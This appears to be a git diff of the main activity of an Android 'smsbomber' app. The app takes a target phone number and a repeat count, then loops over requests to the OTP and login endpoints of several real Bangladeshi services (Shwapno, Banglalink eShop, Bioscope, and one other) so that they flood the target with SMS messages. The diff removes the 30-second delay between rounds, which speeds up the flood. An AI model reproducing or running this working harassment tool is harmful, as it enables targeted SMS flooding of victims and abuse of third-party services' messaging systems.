@@ -1,10 +1,17 @@
 package com.example.smsbomber;
 
 import android.content.Context;
+import android.content.Intent;
+import android.graphics.Color;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.Bundle;
+import android.view.Menu;
+import android.view.MenuInflater;
+import android.view.MenuItem;
 import android.view.View;
+import android.view.Window;
+import android.view.WindowManager;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.ProgressBar;
@@ -19,6 +26,7 @@ import com.android.volley.VolleyError;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 
 import org.json.JSONException;
@@ -28,9 +36,9 @@ import java.util.HashMap;
 import java.util.Map;
 import java.util.Random;
 
-public class MainActivity extends AppCompatActivity  implements View.OnClickListener {
+public class MainActivity extends AppCompatActivity implements View.OnClickListener {
 
-    private EditText numberEditText,amountEditText;
+    private EditText numberEditText, amountEditText;
     private Button attackButton;
     private TextView resultTextView;
     private ProgressBar progressBar;
@@ -38,54 +46,58 @@ public class MainActivity extends AppCompatActivity  implements View.OnClickList
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        requestWindowFeature(Window.FEATURE_NO_TITLE);
+        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                WindowManager.LayoutParams.FLAG_FULLSCREEN);
         setContentView(R.layout.activity_main);
 
-
-        numberEditText=findViewById(R.id.text1);
-        amountEditText=findViewById(R.id.text2);
-        attackButton=findViewById(R.id.click);
-        resultTextView=findViewById(R.id.tView);
+        numberEditText = findViewById(R.id.text1);
+        amountEditText = findViewById(R.id.text2);
+        attackButton = findViewById(R.id.click);
+        resultTextView = findViewById(R.id.tView);
         attackButton.setOnClickListener(this);
 
-        if(isNetworkAvailable()){
-            Toast.makeText(MainActivity.this,"Internet Connected",Toast.LENGTH_SHORT);
+        if (isNetworkAvailable()) {
+            Toast.makeText(MainActivity.this, "Internet Connected", Toast.LENGTH_SHORT);
         }
 
-        progressBar=findViewById(R.id.progressBar);
+        progressBar = findViewById(R.id.progressBar);
         progressBar.setVisibility(View.GONE);
-
     }
 
     @Override
     public void onClick(View v) {
 
         try {
-            if (v.getId()==R.id.click)
-            {
+            if (v.getId() == R.id.click) {
+                attackButton.setBackgroundColor(Color.parseColor("#FF03A9F4"));
                 progressBar.setVisibility(View.VISIBLE);
                 resultTextView.setText("Please Wait and Don't Close APP");
                 attackButton.setEnabled(false);
+                Thread.sleep(2000);
 
                 String mobile = numberEditText.getText().toString();
                 int amount = Integer.parseInt(amountEditText.getText().toString());
-                for(int i=0;i<amount;i++){
+                for (int i = 0; i < amount; i++) {
                     swapnoApi(mobile);
                     blshopApi(mobile);
                     bongobdApi(mobile);
                     bioscopeApi(mobile);
-                    Thread.sleep(30000);
+                    //             Thread.sleep(30000);
                 }
                 progressBar.setVisibility(View.GONE);
-                resultTextView.setText("DONE");
+                //             resultTextView.setText("DONE");
                 attackButton.setEnabled(true);
             }
-        }catch (Exception e) {
+        } catch (Exception e) {
             resultTextView.setText("Unsuccessfull");
         }
 
     }
-    private void swapnoApi(String mobile){
-        String url = String.valueOf("https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO="+mobile+"&countryPhoneCode=%2B88");
+
+    private void swapnoApi(String mobile) {
+        String url = String.valueOf("https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=" + mobile + "&countryPhoneCode=%2B88");
         boolean flag = false;
         RequestQueue queue = Volley.newRequestQueue(this);
         StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
@@ -105,7 +117,7 @@ public class MainActivity extends AppCompatActivity  implements View.OnClickList
         queue.add(stringRequest);
     }
 
-    private void blshopApi(String mobile){
+    private void blshopApi(String mobile) {
         String url = String.valueOf("https://eshop.banglalink.net/wp-admin/admin-ajax.php");
         boolean flag = false;
         RequestQueue queue = Volley.newRequestQueue(this);
@@ -122,7 +134,7 @@ public class MainActivity extends AppCompatActivity  implements View.OnClickList
             public void onErrorResponse(VolleyError error) {
                 // enjoy your error status
             }
-        }){
+        }) {
             @Override
             public String getBodyContentType() {
                 return "application/x-www-form-urlencoded; charset=UTF-8";
@@ -177,7 +189,7 @@ public class MainActivity extends AppCompatActivity  implements View.OnClickList
                 // on below line we are passing our key
                 // and value pair to our parameters.
                 params.put("operator", "all");
-                params.put("msisdn", String.valueOf("88"+mobile));
+                params.put("msisdn", String.valueOf("88" + mobile));
                 // at last we are
                 // returning our params.
                 return params;
@@ -187,8 +199,9 @@ public class MainActivity extends AppCompatActivity  implements View.OnClickList
         // a json object request.
         queue.add(request);
     }
-    private void bioscopeApi(String mobile){
-        String url = String.valueOf("https://www.bioscopelive.com/bn/login/send-otp?phone=88"+mobile+"&operator=bd-otp");
+
+    private void bioscopeApi(String mobile) {
+        String url = String.valueOf("https://www.bioscopelive.com/bn/login/send-otp?phone=88" + mobile + "&operator=bd-otp");
         boolean flag = false;
         RequestQueue queue = Volley.newRequestQueue(this);
         StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
@@ -212,6 +225,33 @@ public class MainActivity extends AppCompatActivity  implements View.OnClickList
         ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
         NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
         return activeNetworkInfo != null && activeNetworkInfo.isConnected();
+    }
+
+
+    @Override
+    public boolean onCreateOptionsMenu(Menu menu) {
+        MenuInflater menuInflater = getMenuInflater();
+        menuInflater.inflate(R.menu.menu_2layout, menu);
+        return super.onCreateOptionsMenu(menu);
+    }
+
+    @Override
+    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
+        if (item.getItemId() == R.id.srid) {
+            Intent intent = new Intent(Intent.ACTION_SEND);
+            intent.setType("text/plain");
+            String subject = "Anything what you want";
+            String body = "So much important app !!";
+            intent.putExtra(Intent.EXTRA_SUBJECT, subject);
+            intent.putExtra(Intent.EXTRA_TEXT, body);
+            startActivity(Intent.createChooser(intent, "Share with"));
+        }
+        if (item.getItemId() == R.id.usid) {
+            Intent intent = new Intent(this, AboutUs.class);
+            startActivity(intent);
+
+        }
+        return super.onOptionsItemSelected(item);
     }
 
 }
